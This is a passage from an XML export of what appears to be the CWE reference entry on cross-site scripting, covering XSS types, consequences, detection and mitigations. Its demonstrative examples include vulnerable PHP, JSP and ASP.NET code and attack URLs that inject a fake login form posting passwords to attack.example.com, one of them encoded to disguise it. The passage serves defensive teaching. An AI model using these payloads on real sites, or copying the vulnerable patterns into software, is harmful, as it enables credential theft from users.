               <xhtml:div>The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:div>
            </xhtml:div>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 2: Stored XSS (or Persistent)</xhtml:div>
               <xhtml:div>The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.</xhtml:div>
            </xhtml:div>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 0: DOM-Based XSS</xhtml:div>
               <xhtml:div>In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="494" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="352" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Often"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:div style="color:#32498D; font-weight:bold;">Same Origin Policy</xhtml:div>
               <xhtml:p>The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
               <xhtml:div style="color:#32498D; font-weight:bold;">Domain</xhtml:div>
               <xhtml:p>The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSS</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>CSS</Term>
               <Description>"CSS" was once used as the acronym for this problem, but this could cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.</Effectiveness_Notes>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</xhtml:p>
                  <xhtml:p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</xhtml:p>
                  <xhtml:p>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>HTML body</xhtml:li>
                        <xhtml:li>Element attributes (such as src="XYZ")</xhtml:li>
                        <xhtml:li>URIs</xhtml:li>
                        <xhtml:li>JavaScript sections</xhtml:li>
                        <xhtml:li>Cascading Style Sheets and style property</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>etc. Note that HTML Entity Encoding is only appropriate for the HTML body.</xhtml:p>
                  <xhtml:p>Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                  <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code displays a welcome message on a web page based on the HTTP GET username parameter. This example covers a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$username = $_GET['username'];<xhtml:br/>echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>&lt;div class="header"&gt; Welcome,<xhtml:div style="margin-left:10px;">
                        <xhtml:div>&lt;div id="stealPassword"&gt;Please Login:<xhtml:div style="margin-left:10px;">
                              <xhtml:div>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;</xhtml:div>
                                 </xhtml:div>
                                 <xhtml:br/>&lt;/form&gt;</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>&lt;/div&gt;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br/>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br/>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br/>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br/>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br/>+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br/>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br/>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
               </Example_Code>
               <Body_Text>The same attack string could also be obfuscated as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<xhtml:br/>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<xhtml:br/>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<xhtml:br/>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<xhtml:br/>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<xhtml:br/>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<xhtml:br/>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<xhtml:br/>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<xhtml:br/>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<xhtml:br/>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<xhtml:br/>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<xhtml:br/>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<xhtml:br/>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<xhtml:br/>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<xhtml:br/>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<xhtml:br/>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<xhtml:br/>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<xhtml:br/>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<xhtml:br/>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<xhtml:br/>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<xhtml:br/>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<xhtml:br/>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<xhtml:br/>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<xhtml:br/>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example also displays a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="bad" Language="JSP">
                  <xhtml:div>&lt;% String eid = request.getParameter("eid"); %&gt;<xhtml:br/>...<xhtml:br/>Employee ID: &lt;%= eid %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>protected System.Web.UI.WebControls.TextBox Login;<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeID;<xhtml:br/>...<xhtml:br/>EmployeeID.Text = Login.Text;<xhtml:br/>... (HTML follows) ...<xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example covers a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.</Body_Text>
               <Example_Code Nature="bad" Language="JSP">
                  <xhtml:div>&lt;%<xhtml:div style="margin-left:10px;">
                        <xhtml:div>...<xhtml:br/>Statement stmt = conn.createStatement();<xhtml:br/>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<xhtml:br/>if (rs != null) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>rs.next();<xhtml:br/>String name = rs.getString("name");<xhtml:br/>%&gt;</xhtml:div>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>
                     <xhtml:br/>Employee Name: &lt;%= name %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>protected System.Web.UI.WebControls.Label EmployeeName;<xhtml:br/>...<xhtml:br/>string query = "select * from emp where id=" + eid;<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>sda.Fill(dt);<xhtml:br/>string name = dt.Rows[0]["Name"];<xhtml:br/>...<xhtml:br/>EmployeeName.Text = name;</xhtml:div>
               </Example_Code>
               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>CreateUser.php</Body_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
               </Example_Code>
               <Body_Text>The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:</Body_Text>
               <Body_Text>ListUsers.php</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>$query = 'Select * From users Where loggedIn=true';<xhtml:br/>$results = mysql_query($query);<xhtml:br/>if (!$results) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>exit;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:div>
                        <xhtml:i>//Print list of users to page</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>echo '&lt;div id="userlist"&gt;Currently Active Users:';<xhtml:br/>while ($row = mysql_fetch_assoc($results)) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>echo '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-5080</Reference>
               <Description>Chain: protection mechanism failure allows XSS</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5080</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4308</Reference>
               <Description>Chain: only checks "javascript:" tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4308</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5727</Reference>
               <Description>Chain: only removes SCRIPT tags, enabling XSS</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5727</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5770</Reference>
               <Description>Reflected XSS using the PATH_INFO in a URL</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5770</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4730</Reference>
               <Description>Reflected XSS not properly handled when generating an error message</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5734</Reference>
               <Description>Reflected XSS sent through email message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5734</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0971</Reference>
               <Description>Stored XSS in a security product.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5249</Reference>
               <Description>Stored XSS using a wiki page.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5249</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3568</Reference>
               <Description>Stored XSS in a guestbook application.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3568</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3211</Reference>
               <Description>Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3211</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3295</Reference>
               <Description>Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3295</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-site scripting (XSS)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Cross-site scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A1</Entry_ID>
